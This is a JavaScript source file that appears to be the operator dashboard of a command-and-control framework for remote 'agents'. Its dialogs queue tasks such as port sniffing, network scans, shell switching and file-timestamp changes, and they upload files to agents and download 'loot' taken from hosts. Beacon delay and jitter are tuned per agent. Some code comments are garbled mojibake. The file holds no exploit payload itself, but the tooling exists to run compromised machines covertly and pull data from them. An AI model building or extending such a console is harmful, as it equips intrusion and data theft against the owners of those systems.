                    event.preventDefault();
                    const fileInput = dialog.querySelector("#uploadFile");
                    const file = fileInput && fileInput.files ? fileInput.files[0] : null;
                    if(!file){
                        customAlert("Please select a file");
                        return;
                    }
                    const splitSizeInput = dialog.querySelector("#splitSize");
                    const splitSize = splitSizeInput && splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                    const file_name = fliemanage.shell_dir + "/" + file.name;
                    const toastId = createTransferToastId("upload-file");
                    try{
                        await webSocketClient.sendFile(
                            "uploadFile",
                            {
                                uid:fliemanage.uid,
                                filename:file_name,
                                splitSize:String(splitSize)
                            },
                            file,
                            32 * 1024,
                            (received, total) => {
                                const percent = total > 0
                                    ? Math.min(100, Math.floor(received / total * 100))
                                    : 0;
                                customTransferToast(toastId, {
                                    title: "Upload " + file.name,
                                    percent,
                                    state: "active",
                                    detail: formatTransferBytes(received) + " / " + formatTransferBytes(total),
                                });
                            }
                        );
                        customTransferToast(toastId, {
                            title: "Upload " + file.name,
                            percent: 100,
                            state: "done",
                            detail: file_name,
                            removeAfter: 1200,
                        });
                        console.log(file_name,"File uploaded successfully");
                        fliemanage.loadFile(
                            file_name,
                            file.size
                        );
                    }catch(err){
                        console.error(
                            "upload error:",
                            err
                        );
                        customTransferToast(toastId, {
                            title: "Upload " + file.name,
                            percent: 0,
                            state: "error",
                            detail: err.message || "upload failed",
                            removeAfter: 2000,
                        });
                        customLog("Upload failed");
                    }
                });

                // 杩斿洖涓婄骇鐩綍
                const dirBtn = dialog.querySelector("#dir-btn");
                if (dirBtn) {
                    dirBtn.addEventListener("click", function() {
                        fliemanage.move_file(1, "no");
                    });
                }

                // 璺宠浆鐩綍
                const btn = dialog.querySelector("#moveDirButton");
                if (btn) {
                btn.addEventListener("click", () => fliemanage.move_dir());
                }

                dialog.addEventListener("mousedown", function() {
                    window.activeFileManager = fliemanage;
                    dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                });

                // 鍒濆鍖�
                fliemanage.shell_dir = dir || "./";
                fliemanage.history_file(uid);
                fliemanage.look_file(fliemanage.shell_dir);

            }, 200);
        }
        showMsgDialog(uid, host) {
            const dialogId = "msg-dialog-" + uid;
            let dialog = document.getElementById(dialogId);

            if (dialog) {
                dialog.style.display = "block";
                dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                return;
            }

            dialog = document.createElement("div");
            dialog.id = dialogId;
            dialog.dataset.uid = uid;
            dialog.style.position = "fixed";
            dialog.style.top = "10%";
            dialog.style.left = "50%";
            dialog.style.transform = "translateX(-50%)";
            dialog.style.background = "#fff";
            dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
            dialog.style.maxWidth = "700px";
            dialog.style.width = "90vw";
            dialog.style.maxHeight = "90vh";
            dialog.style.overflow = "auto";
            dialog.style.border = "1px solid #ccc";
            dialog.style.borderRadius = "8px";
            dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
            dialog.style.padding = "16px";
            dialog.style.userSelect = "none";
            dialog.style.touchAction = "none";
            document.body.appendChild(dialog);

            dialog.innerHTML =
                '<div id="msg-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
                '<button id="msg-close-btn" class="dialog-close-btn" type="button">x</button>' +
                '<div style="display:flex;align-items:center;margin-top:32px;">' +
                    '<h2>Msg list</h2>' +
                    "<p id='hostname' style='margin-left:25px;'>Host:" + host + "</p>" +
                '</div>' +
                '<div id="msg-container">loading...</div>';

            const style = document.getElementById("msg-dialog-style") || document.createElement("style");
            style.id = "msg-dialog-style";
            style.textContent =
                ".msg-item {background:white;border:1px solid #ccc;padding:10px;margin-bottom:8px;position:relative;}" +
                ".btn-group {position:absolute;right:10px;top:10px;}" +
                ".move-btn, .del-btn {margin-left:5px;padding:4px 6px;font-size:14px;}" +
                ".msg-item span {user-select:none;}" +
                ".msg-item span[title] {color:blue;text-decoration:underline dotted;}" +
                ".msg-item-dragging {opacity:0.92;box-shadow:0 14px 32px rgba(0,0,0,0.14);z-index:10020;}" +
                ".msg-drag-handle {margin-right:6px;padding:2px 6px;border:1px solid #d7dde5;background:#f7f9fc;border-radius:8px;cursor:grab;touch-action:none;color:#6b7b8b;}" +
                ".msg-drag-handle:active {cursor:grabbing;}" +
                ".msg-drop-placeholder {border:1px dashed #9eb3c7;border-radius:10px;margin-bottom:8px;background:rgba(228,236,245,0.45);}";
            if (!style.parentNode) {
                document.head.appendChild(style);
            }

            const dragBar = dialog.querySelector("#msg-drag-bar");
            const msgContainer = dialog.querySelector("#msg-container");

            dialog._msgClosed = false;
            dialog._msgWatchTimer = null;
            dialog._msgInterval = null;

            let msgPostArray = [];
            let activeMessageDrag = null;
            let resultDeleteQueue = Promise.resolve();
            let isDragging = false;
            let offsetX = 0;
            let offsetY = 0;

            function clamp(val, min, max) {
                return Math.max(min, Math.min(val, max));
            }

            function getDialogRect() {
                return dialog.getBoundingClientRect();
            }

            function stopMove() {
                isDragging = false;
                document.body.style.userSelect = "";
                document.removeEventListener("mousemove", onMove);
                document.removeEventListener("mouseup", stopMove);
                document.removeEventListener("touchmove", onMove);
                document.removeEventListener("touchend", stopMove);
            }

            function stopLoadMessages() {
                if (dialog._msgClosed) {
                    return;
                }

                dialog._msgClosed = true;

                if (dialog._msgWatchTimer) {
                    clearInterval(dialog._msgWatchTimer);
                    dialog._msgWatchTimer = null;
                }

                if (dialog._msgInterval) {
                    clearInterval(dialog._msgInterval);
                    dialog._msgInterval = null;
                }

                stopMove();

                if (activeMessageDrag) {
                    document.removeEventListener("pointermove", onMessageDragMove);
                    document.removeEventListener("pointerup", stopMessageDrag);
                    document.body.style.userSelect = "";
                    activeMessageDrag = null;
                }
            }

            dialog.querySelector("#msg-close-btn").onclick = function () {
                stopLoadMessages();
                dialog.remove();
            };

            function onMove(e) {
                if (!isDragging) return;

                const clientX = e.touches ? e.touches[0].clientX : e.clientX;
                const clientY = e.touches ? e.touches[0].clientY : e.clientY;
                let newLeft = clientX - offsetX;
                let newTop = clientY - offsetY;

                const rect = getDialogRect();
                const winW = window.innerWidth;
                const winH = window.innerHeight;
                const maxLeft = winW - rect.width;
                const maxTop = winH - rect.height;

                newLeft = clamp(newLeft, 0, maxLeft > 0 ? maxLeft : 0);
                newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);

                dialog.style.left = newLeft + "px";
                dialog.style.top = newTop + "px";
                dialog.style.transform = "";
            }

            dragBar.addEventListener("mousedown", function (e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("mousemove", onMove);
                document.addEventListener("mouseup", stopMove);
            });

            dragBar.addEventListener("touchstart", function (e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.touches[0].clientX - rect.left;
                offsetY = e.touches[0].clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("touchmove", onMove, { passive: false });
                document.addEventListener("touchend", stopMove);
            });

            function renderMsgText(rawMsg) {
                let taskId = "";
                let msgContent = rawMsg;
                const colonIndex = rawMsg.indexOf(":");

                if (colonIndex >= 0) {
                    taskId = rawMsg.substring(0, colonIndex).trim();
                    msgContent = rawMsg.substring(colonIndex + 1).trim();
                }

                const parts = msgContent.split("*//*");
                let result = msgContent;

                switch (parts[0]) {
                    case "GET_U_FRIENDS":
                        result = "scan: " + parts[1] + "   range: " + parts[2] + "   delay: " + parts[3];
                        break;
                    case "GET_DELAY":
                        result = "change delay: " + parts[1] + " seconds";
                        break;
                    case "GET_U_FILE":
                        result = "File: " + parts[1] + "   Size: " + parts[2] + " bytes";
                        break;
                    case "LOAD_U_FILE":
                        result = "File: " + parts[1];
                        break;
                    case "LOOK_UP_FILE":
                        result = "lookDir: " + parts[1];
                        break;
                    case "GET_PORTS":
                        result = "sniff: " + parts[1] + "   range: " + parts[2] + "   delay: " + parts[3];
                        break;
                    case "SWITCH_VERSION":
                        result = "change shell: " + parts[1];
                        break;
                    case "CHANG_FILE_NAME":
                        result = "change file name: " + parts[1] + " -> " + parts[2];
                        break;
                    case "CHANG_FILE_TIME":
                        result = "change file time: " + parts[1] + " -> " + parts[2];
                        break;
                    case "GET_JITTER":
                        result = "change jitter: " + parts[1];
                        break;
                }

                return taskId ? result + "   taskid: " + taskId : result;
            }

            function createMessageItem({
                text,
                index = null,
                rawMessage = "",
                sourceIndex = null,
                expandable = false,
                onDelete = null,
                withMove = false,
                withCopy = false
            }) {
                const msgDiv = document.createElement("div");
                msgDiv.className = "msg-item";

                if (withMove) msgDiv.dataset.reorderable = "true";
                if (rawMessage !== null && rawMessage !== undefined) msgDiv.dataset.rawMessage = rawMessage;
                if (sourceIndex !== null && sourceIndex !== undefined) msgDiv.dataset.sourceIndex = String(sourceIndex);

                msgDiv.style.display = "flex";
                msgDiv.style.justifyContent = "space-between";
                msgDiv.style.alignItems = "center";
                msgDiv.style.gap = "8px";

                const left = document.createElement("div");
                left.style.display = "flex";
                left.style.alignItems = "center";
                left.style.gap = "8px";
                left.style.flex = "1";

                if (withMove) {
                    const handle = document.createElement("button");
                    handle.type = "button";
                    handle.className = "msg-drag-handle";
                    handle.textContent = "⋮⋮";
                    handle.title = "Drag to reorder";
                    handle.addEventListener("pointerdown", function (event) {
                        startMessageDrag(msgDiv, handle, event);
                    });
                    left.appendChild(handle);
                }

                if (index !== null) {
                    const idx = document.createElement("span");
                    idx.className = "msg-index";
                    idx.textContent = "[" + String(index).padStart(2, "0") + "] ";
                    left.appendChild(idx);
                }

                const span = document.createElement("span");
                let expanded = false;

                if (expandable && text.length > 10) {
                    const shortText = text.slice(0, 10) + "…";
                    span.textContent = shortText;
                    span.style.cursor = "pointer";
                    span.onclick = () => {
                        expanded = !expanded;
                        span.textContent = expanded ? text : shortText;
                    };
                } else {
                    span.textContent = text;
                }

                left.appendChild(span);
                msgDiv.appendChild(left);

                const btnGroup = document.createElement("div");
                btnGroup.style.display = "flex";
                btnGroup.style.gap = "4px";

                if (withCopy) {
                    const copy = document.createElement("button");
                    copy.textContent = "📋";
                    copy.onclick = () => {
                        navigator.clipboard.writeText(text).then(() => {
                            copy.textContent = "✔️";
                            setTimeout(() => {
                                copy.textContent = "📋";
                            }, 1000);
                        });
                    };
                    btnGroup.appendChild(copy);
                }

                if (onDelete) {
                    const del = document.createElement("button");
                    del.textContent = "🗑️";
                    del.onclick = () => onDelete(msgDiv);
                    btnGroup.appendChild(del);
                }

                msgDiv.appendChild(btnGroup);
                return msgDiv;
            }

            function initMsgLayout() {
                msgContainer.innerHTML = "";

                const requestList = document.createElement("div");
                requestList.id = "msg-request-list";
                msgContainer.appendChild(requestList);

                const resultTitle = document.createElement("h2");
                resultTitle.id = "msg-result-title";
                resultTitle.textContent = "result List";
                resultTitle.style.display = "none";
                msgContainer.appendChild(resultTitle);

                const resultList = document.createElement("div");
                resultList.id = "msg-result-list";
                msgContainer.appendChild(resultList);
            }

            function getRequestList() {
                return dialog.querySelector("#msg-request-list");
            }

            function getResultList() {
                return dialog.querySelector("#msg-result-list");
            }

            function getReorderItems() {
                const requestList = getRequestList();
                if (!requestList) return [];
                return Array.from(requestList.querySelectorAll('.msg-item[data-reorderable="true"]'));
            }

            function refreshMessageIndexes() {
                getReorderItems().forEach(function (item, index) {
                    const idx = item.querySelector(".msg-index");
                    if (idx) {
                        idx.textContent = "[" + String(index).padStart(2, "0") + "] ";
                    }
                    item.dataset.sourceIndex = String(index);
                });

                msgQueues[uid] = getReorderItems().map(function (item) {
                    return item.dataset.rawMessage || "";
                });
            }

            function refreshResultIndexes(container) {
                Array.from(container.querySelectorAll('[data-result-item="true"]')).forEach((el, idx) => {
                    el.dataset.resultIndex = String(idx);
                });
            }

            function renderRequestList() {
                const requestList = getRequestList();
                if (!requestList) return;

                requestList.innerHTML = "";

                const listData = Array.isArray(msgQueues[uid]) ? msgQueues[uid] : [];
                listData.forEach((raw, i) => {
                    requestList.appendChild(
                        createMessageItem({
                            text: renderMsgText(raw),
                            index: i,
                            rawMessage: raw,
                            sourceIndex: i,
                            withMove: true,
                            onDelete: div => deleteMsg(div)
                        })
                    );
                });
            }

            function renderResultList() {
                const resultTitle = dialog.querySelector("#msg-result-title");
                const resultList = getResultList();
                if (!resultTitle || !resultList) return;

                msgPostArray = Array.isArray(resultQueues[uid]) ? resultQueues[uid].slice() : [];
                resultList.innerHTML = "";

                if (msgPostArray.length === 0) {
                    resultTitle.style.display = "none";
                    return;
                }

                resultTitle.style.display = "";

                msgPostArray.forEach((raw, i) => {
                    const div = createMessageItem({
                        text: raw,
                        expandable: true,
                        withCopy: true,
                        onDelete: div => queueDeleteResult(div)
                    });
                    div.dataset.resultItem = "true";
                    div.dataset.resultIndex = String(i);
                    resultList.appendChild(div);
                });

                refreshResultIndexes(resultList);
            }

            async function deleteMsg(msgDiv) {
                const requestList = getRequestList();
                const idx = requestList ? Array.from(requestList.children).indexOf(msgDiv) : -1;
                if (idx < 0) return;

                try {
                    const responsePromise = webSocketClient.waitForMessage(
                        (msg) => msg.path === "delMsgGet" && msg.uid === uid && msg.taskid === AgentTaskId && msg.index === String(idx)
                    );

                    const sent = await webSocketClient.send("delMsgGet", {
                        uid: uid,
                        index: String(idx),
                        taskid: AgentTaskId
                    });

                    if (!sent) {
                        throw new Error("failed to send delete request");
                    }

                    const data = await responsePromise;
                    if (data && data.code === 200 && data.uid === uid && data.taskid === AgentTaskId && msg.index === String(idx)) {
                        if (Array.isArray(msgQueues[uid])) {
                            msgQueues[uid].splice(idx, 1);
                        }
                        renderRequestList();
                        customLog("Message deleted");
                    } else {
                        throw new Error(data?.message || "delete failed");
                    }
                } catch (err) {
                    console.error("delete msg error:", err);
                }
            }

            async function doDeleteResult(div) {
                if (!div || dialog._msgClosed || !dialog.isConnected) {
                    return;
                }

                if (div.dataset.deleting === "true") {
                    return;
                }

                const realIndex = Number(div.dataset.resultIndex || "-1");
                if (realIndex < 0 || realIndex >= msgPostArray.length) {
                    customLog("Result not found");
                    return;
                }

                div.dataset.deleting = "true";
                div.style.opacity = "0.6";
                div.style.pointerEvents = "none";

                try {
                    const responsePromise = webSocketClient.waitForMessage(
                        (msg) =>
                            msg.path === "delMsgMap" &&
                            msg.uid === uid &&
                            msg.index === String(realIndex) &&
                            msg.taskid === AgentTaskId
                    );

                    const sent = await webSocketClient.send("delMsgMap", {
                        uid: uid,
                        index: String(realIndex),
                        taskid: AgentTaskId
                    });

                    if (!sent) {
                        customLog("Delete failed");
                        return;
                    }

                    const data = await responsePromise;
                    if (data && data.code === 200 && data.uid === uid && data.index === String(realIndex) && data.taskid === AgentTaskId) {
                        if (Array.isArray(resultQueues[uid])) {
                            resultQueues[uid].splice(realIndex, 1);
                        }
                        msgPostArray.splice(realIndex, 1);
                        renderResultList();
                        customLog("Result deleted");
                    } else {
                        customLog(data?.message || "Delete failed");
                    }
                } catch (err) {
                    console.error("delMsgMap error:", err);
                    customLog("Delete failed");
                } finally {
                    if (div && div.isConnected) {
                        div.dataset.deleting = "";
                        div.style.opacity = "";
                        div.style.pointerEvents = "";
                    }
                }
            }

            function queueDeleteResult(div) {
                resultDeleteQueue = resultDeleteQueue
                    .catch(() => {})
                    .then(() => doDeleteResult(div));
                return resultDeleteQueue;
            }

            function startMessageDrag(msgDiv, handle, event) {
                const requestList = getRequestList();
                const items = getReorderItems();
                if (!requestList || items.length <= 1 || activeMessageDrag) return;

                event.preventDefault();
                event.stopPropagation();

                const rect = msgDiv.getBoundingClientRect();
                const placeholder = document.createElement("div");
                placeholder.className = "msg-drop-placeholder";
                placeholder.style.height = rect.height + "px";

                const startIndex = items.indexOf(msgDiv);
                const originalNextSibling = msgDiv.nextElementSibling;

                requestList.insertBefore(placeholder, msgDiv.nextSibling);
                document.body.appendChild(msgDiv);
                msgDiv.classList.add("msg-item-dragging");
                msgDiv.style.position = "fixed";
                msgDiv.style.left = rect.left + "px";
                msgDiv.style.top = rect.top + "px";
                msgDiv.style.width = rect.width + "px";
                msgDiv.style.pointerEvents = "none";

                activeMessageDrag = {
                    item: msgDiv,
                    handle: handle,
                    placeholder: placeholder,
                    requestList: requestList,
                    startIndex: startIndex,
                    originalNextSibling: originalNextSibling,
                    offsetX: event.clientX - rect.left,
                    offsetY: event.clientY - rect.top
                };

                document.addEventListener("pointermove", onMessageDragMove);
                document.addEventListener("pointerup", stopMessageDrag);
                document.body.style.userSelect = "none";
            }

            function onMessageDragMove(event) {
                if (!activeMessageDrag) return;

                event.preventDefault();

                const drag = activeMessageDrag;
                drag.item.style.left = (event.clientX - drag.offsetX) + "px";
                drag.item.style.top = (event.clientY - drag.offsetY) + "px";

                const siblings = Array.from(drag.requestList.querySelectorAll('.msg-item[data-reorderable="true"]'));
                let inserted = false;

                for (const sibling of siblings) {
                    const rect = sibling.getBoundingClientRect();
                    if (event.clientY < rect.top + rect.height / 2) {
                        drag.requestList.insertBefore(drag.placeholder, sibling);
                        inserted = true;
                        break;
                    }
                }

                if (!inserted) {
                    drag.requestList.appendChild(drag.placeholder);
                }
            }

            async function sendReorderByIndex(s_id, t_id, mode) {
                if (s_id === -1 || t_id === -1) {
                    throw new Error("invalid dom index");
                }

                const pos = mode === "before" ? t_id : t_id + 1;

                const responsePromise = webSocketClient.waitForMessage(
                    (msg) =>
                        msg.path === "changeMsh" &&
                        msg.uid === uid &&
                        msg.taskid === AgentTaskId
                );

                const sent = await webSocketClient.send("changeMsh", {
                    uid: uid,
                    s_id: String(s_id),
                    pos: String(pos),
                    taskid: AgentTaskId
                });

                if (!sent) {
                    throw new Error("failed to send reorder request");
                }

                const data = await responsePromise;
                if (!data || data.code !== 200 || data.uid !== uid || data.taskid !== AgentTaskId) {
                    throw new Error(data?.message || "reorder failed");
                }

                return data;
            }

            async function stopMessageDrag() {
                if (!activeMessageDrag) return;

                const drag = activeMessageDrag;
                activeMessageDrag = null;
                document.removeEventListener("pointermove", onMessageDragMove);
                document.removeEventListener("pointerup", stopMessageDrag);
                document.body.style.userSelect = "";

                const requestChildren = Array.from(drag.requestList.children);
                const placeholderIndex = requestChildren.indexOf(drag.placeholder);
                const prevItem = drag.placeholder.previousElementSibling;
                const nextItem = drag.placeholder.nextElementSibling;

                drag.item.classList.remove("msg-item-dragging");
                drag.item.style.position = "";
                drag.item.style.left = "";
                drag.item.style.top = "";
                drag.item.style.width = "";
                drag.item.style.pointerEvents = "";

                try {
                    if (placeholderIndex !== drag.startIndex) {
                        let targetSourceIndex = -1;
                        let mode = "";

                        if (nextItem && nextItem.dataset.reorderable === "true") {
                            targetSourceIndex = Number(nextItem.dataset.sourceIndex || "0");
                            mode = "before";
                        } else if (prevItem && prevItem.dataset.reorderable === "true") {
                            targetSourceIndex = Number(prevItem.dataset.sourceIndex || "0");
                            mode = "after";
                        }

                        drag.requestList.insertBefore(drag.item, drag.placeholder);
                        drag.placeholder.remove();

                        if (targetSourceIndex !== -1) {
                            await sendReorderByIndex(drag.startIndex, targetSourceIndex, mode);
                        }

                        refreshMessageIndexes();
                    } else {
                        if (drag.originalNextSibling && drag.originalNextSibling.parentNode === drag.requestList) {
                            drag.requestList.insertBefore(drag.item, drag.originalNextSibling);
                        } else {
                            drag.requestList.appendChild(drag.item);
                        }
                        drag.placeholder.remove();
                        refreshMessageIndexes();
                    }
                } catch (err) {
                    console.error("drag reorder failed:", err);

                    if (drag.originalNextSibling && drag.originalNextSibling.parentNode === drag.requestList) {
                        drag.requestList.insertBefore(drag.item, drag.originalNextSibling);
                    } else {
                        drag.requestList.appendChild(drag.item);
                    }

                    if (drag.placeholder.parentNode) {
                        drag.placeholder.remove();
                    }

                    refreshMessageIndexes();
                    renderRequestList();
                }
            }

            async function fetchMsgQueue() {
                try {
                    const responsePromise = webSocketClient.waitForMessage(
                        (msg) => msg.path === "getMsg" && msg.code === 200 && msg.uid === uid
                    );
                    const ok = await webSocketClient.send("getMsg", { uid: uid });
                    if (!ok) return;
                    const response = await responsePromise;
                    if (response && response.data) {
                        msgQueues[uid] =  Array.isArray(response.data?.data) ? response.data.data : [];
                    }
                } catch (err) {
                    console.log("fetch getMsg error:", err);
                }
            }

            async function fetchResultQueue() {
                try {
                    const responsePromise = webSocketClient.waitForMessage(
                        (msg) => msg.path === "getMsgMap" && msg.code === 200 && msg.uid === uid
                    );
                    const ok = await webSocketClient.send("getMsgMap", { uid: uid });
                    if (!ok) return;
                    const response = await responsePromise;
                    if (response && response.data) {
                        resultQueues[uid] =  Array.isArray(response.data?.data) ? response.data.data : [];
                    }
                } catch (err) {
                    console.log("fetch getMsgMap error:", err);
                }
            }

            function getMessageSignature() {
                return JSON.stringify(Array.isArray(msgQueues[uid]) ? msgQueues[uid] : []);
            }

            function getResultSignature() {
                return JSON.stringify(Array.isArray(resultQueues[uid]) ? resultQueues[uid] : []);
            }

            function renderAll() {
                if (dialog._msgClosed || !dialog.isConnected) return;
                renderRequestList();
                renderResultList();
            }

            function startDataWatcher() {
                let lastMsgSig = getMessageSignature();
                let lastResultSig = getResultSignature();

                dialog._msgWatchTimer = setInterval(() => {
                    if (dialog._msgClosed || !dialog.isConnected) {
                        stopLoadMessages();
                        return;
                    }

                    if (activeMessageDrag) {
                        return;
                    }

                    const nextMsgSig = getMessageSignature();
                    const nextResultSig = getResultSignature();

                    if (nextMsgSig !== lastMsgSig) {
                        lastMsgSig = nextMsgSig;
                        renderRequestList();
                    }

                    if (nextResultSig !== lastResultSig) {
                        lastResultSig = nextResultSig;
                        renderResultList();
                    }
                }, 300);
            }

            initMsgLayout();

            Promise.allSettled([fetchMsgQueue(), fetchResultQueue()]).then(() => {
                if (dialog._msgClosed || !dialog.isConnected) {
                    return;
                }

                renderAll();
                startDataWatcher();
            });
        }
        async saveInfo(uid) {
            const remarks = document.getElementById('remarks_' + uid).value;
            const delay = document.getElementById('delay_' + uid).value;
            const jitter = document.getElementById('jitter_' + uid).value;
            const username = document.getElementById('username_' + uid).value;
            try{
                let result = await webSocketClient.send(
                    "change",
                    {
                        remarks: remarks,
                        delay: delay,
                        jitter: jitter,
                        username: username,
                        uid: uid,
                        taskid: AgentTaskId
                    }
                );
            }catch(err){
                console.log("change failed:",err.message);
                let new_user =document.getElementById('username_' + uid).value;
                if(!new_user){
                    return;
                }
                try{
                    let client = await webSocketClient.send(
                        "confirm",
                        {
                            uid:uid,
                            username:new_user
                        }
                    );
                    const userIndex =User_data.findIndex(client=>client.uid===uid);
                    if(userIndex!==-1){
                        User_data[userIndex].remarks =remarks;
                        User_data[userIndex].delay =delay;
                        User_data[userIndex].username =username;
                        User_data[userIndex].jitter =jitter;
                    }
                    this.updateUserUI(uid,remarks,delay,username,jitter);
                }catch(e){
                    console.error("confirm error:",e);
                }
            }
        }
        updateUserUI(uid, remarks, delay, username, jitter) {
            document.getElementById('remarks_' + uid).value = remarks;
            document.getElementById('delay_' + uid).value = delay;
            document.getElementById('username_' + uid).value = username;
            document.getElementById('jitter_' + uid).value = jitter;
        }

        async checkTime(item, forceAnimate = false) {
		    if (!item || !item.uid) return;
		    const userDiv = document.getElementById(item.uid + "info");
		    if (!userDiv) {
		        pendingCheckTimes[item.uid] = item;
		        return;
		    }
		    const checkElement = document.getElementById(item.uid + "-check");
		    const nextTime = item.check_time || "";
		    const previousTime =
		        userDiv.dataset.lastCheckTime ||
		        (checkElement ? checkElement.innerText.trim() : "");
		    const hasNewTime =
		        forceAnimate || (nextTime !== "" && previousTime !== nextTime);
		    const imgId = item.uid + "-img";
		    const state = checkTimeState[item.uid] || (checkTimeState[item.uid] = {
		        animating: false,
		        lastGifStartAt: 0
		    });
		    function renderStaticLine() {
		        const el = document.getElementById(imgId);
		        if (!el) return;
		        el.outerHTML =
		            '<div class="ip-address" id="' + imgId + '"' +
		            ' style="background-color:#8B4513;width:106px;height:1px;' +
		            'display:inline-block;vertical-align:middle;position:relative;">' +
		            '<div style="position:absolute;top:0;left:0;right:0;bottom:0;' +
		            'box-shadow:inset 0 0 0 106px #8B4513;"></div></div>';
		        state.animating = false;
		    }
		    function renderGif(forceRestart = false) {
		        const el = document.getElementById(imgId);
		        if (!el) return;
		        const newSrc = 'rhythm.gif?t=' + Date.now();
		        if (el.tagName === "IMG") {
		            if (forceRestart) {
		                el.src = newSrc;
		            }
		        } else {
		            el.outerHTML =
		                '<img class="ip-address" id="' + imgId + '"' +
		                ' src="' + newSrc + '"' +
		                ' style="width:106px;height:46px;display:inline-block;vertical-align:middle;" />';
		        }
		        state.animating = true;
		        state.lastGifStartAt = Date.now();
		    }
		    if (hasNewTime) {
		        const currentEl = document.getElementById(imgId);
		        const isGifOnScreen = currentEl && currentEl.tagName === "IMG";
		        const gifRunningTooLong = Date.now() - state.lastGifStartAt > 3000;
		        if (!isGifOnScreen) {
		            renderGif(true);
		        } else if (gifRunningTooLong) {
		            renderGif(true);
		        }
		        if (checkTimeTimers[item.uid]) {
		            clearTimeout(checkTimeTimers[item.uid]);
		        }
		        checkTimeTimers[item.uid] = setTimeout(function () {
		            renderStaticLine();
		            delete checkTimeTimers[item.uid];
		        }, 5000);
		    }
		    if (checkElement) {
		        checkElement.innerText = nextTime;
		    }
		    userDiv.dataset.lastCheckTime = nextTime;
		    delete pendingCheckTimes[item.uid];
		}
		
        async del(uid){
            const right = await customConfirm("confirm?");
            if(!right){
                return false;
            }
            const responsePromise = webSocketClient.waitForMessage(
                (msg) => msg.path === "delInfo" &&
                 msg.code === 200 && 
                 msg.uid === uid &&
                 msg.taskid === AgentTaskId
            );
            const sent = await webSocketClient.send(
                "delInfo",
                {
                    uid: uid,
                    taskid: AgentTaskId
                }
            );
            if(!sent){
                customLog("Delete agent failed");
                return false;
            }
            try {
                const result = await responsePromise;
                if(result && result.code === 200 && result.uid === uid && result.taskid === AgentTaskId){
                    document.getElementById("container-" + uid)?.remove();
                    msgQueues[uid] = [];
                    resultQueues[uid] = [];
                    fileQueues[uid] = [];
                    customLog("Agent removed");
                    return true;
                }
                customLog("Delete agent failed:", result);
                return false;
            } catch(err) {
                customLog("Delete agent error:", err.message);
                return false;
            }
        }
    loothander(data){
        const lootDiv = document.getElementById("g_file");
        if(!lootDiv){
            return;
        }
        lootDiv.classList.add("loot-list");
        lootDiv.innerHTML = "";
        if(!Array.isArray(data) || data.length === 0){
            lootDiv.textContent = "No loot available";
            lootDiv.classList.add("loot-empty-state");
            return;
        }
        lootDiv.classList.remove("loot-empty-state");

        data.forEach((entry)=>{
            const uid = entry.uid || "";
            const host = entry.host || "";
            const files = Array.isArray(entry.files) ? entry.files : [];

            const card = document.createElement("div");
            card.className = "loot-card";

            const title = document.createElement("div");
            title.className = "loot-card-title";
            title.innerHTML =
                "<strong>Host:</strong> " + host +
                " <span class='loot-card-uid'><strong>UID:</strong> " + uid + "</span>";
            card.appendChild(title);

            if(files.length === 0){
                const empty = document.createElement("div");
                empty.className = "loot-empty";
                empty.textContent = "No files";
                card.appendChild(empty);
                lootDiv.appendChild(card);
                return;
            }

            files.forEach((file)=>{
                const row = document.createElement("div");
                row.className = "loot-row";

                const info = document.createElement("div");
                info.className = "loot-info";
                const name = file.name || "";
                const size = typeof file.size === "number" ? file.size : 0;
                const modTime = file.mod_time || "";
                info.innerHTML =
                    "<div class='loot-file-name'><strong>" + name + "</strong></div>" +
                    "<div class='loot-meta'>size: " + size +
                    " | modified: " + modTime + "</div>";

                const btn = document.createElement("button");
                btn.type = "button";
                btn.className = "loot-download-btn";
                btn.textContent = "Download";
                btn.onclick = () => {
                    this.downloadLoot(uid, name, btn);
                };

                row.appendChild(info);
                row.appendChild(btn);
                card.appendChild(row);
            });

            lootDiv.appendChild(card);
        });
    }
    async downloadLoot(uid,file, buttonEl = null){
        const originalText = buttonEl ? buttonEl.textContent : "";
        const toastId = createTransferToastId("download-loot");
        try{
            if (buttonEl) {
                buttonEl.disabled = true;
                buttonEl.textContent = "Downloading 0%";
            }

            await webSocketClient.downloadFile(
                "download_loot",
                { uid, file },
                65000,
                1024 * 1024,
                (received, total) => {
                    const percent = total > 0
                        ? Math.min(100, Math.floor(received / total * 100))
                        : 0;
                    customTransferToast(toastId, {
                        title: "Download " + file,
                        percent,
                        state: "active",
                        detail: formatTransferBytes(received) + " / " + formatTransferBytes(total),
                    });
                    if (!buttonEl) {
                        return;
                    }
                    buttonEl.textContent = "Downloading " + percent + "%";
                }
            );

            customTransferToast(toastId, {
                title: "Download " + file,
                percent: 100,
                state: "done",
                detail: file,
                removeAfter: 1200,
            });

            if (buttonEl) {
                buttonEl.textContent = "Downloaded";
            }
        }catch(err){
            console.error(
                "download loot error:",
                err
            );
            if (buttonEl) {
                buttonEl.textContent = "Failed";
            }
            customTransferToast(toastId, {
                title: "Download " + file,
                percent: 0,
                state: "error",
                detail: err.message || "download failed",
                removeAfter: 2000,
            });
            customLog("Download failed");
        } finally {
            if (buttonEl) {
                setTimeout(() => {
                    buttonEl.disabled = false;
                    buttonEl.textContent = originalText || "Download";
                }, 1200);
            }
        }
    }
}
class lain_net{
    async requestNetData(uid = null) {
        const shellSelect = document.getElementById("net_shell");
        uid = uid || (shellSelect ? shellSelect.value : "");
        if (!uid) {
            this.renderNetList([], "");
            this.getshellip([], "");
            return false;
        }
        const sent = await webSocketClient.send(
            "getNetdata",
            {
                uid: uid
            }
        );
        if (!sent) {
            customLog("Get network data failed");
            return false;
        }
        return true;
    }
    renderNetList(net_data = [], uid = null) {
        const netDiv = document.getElementById("net_div");
        if (!netDiv) {
            return;
        }
        netDiv.innerHTML = "";
        if (!Array.isArray(net_data) || net_data.length === 0) {
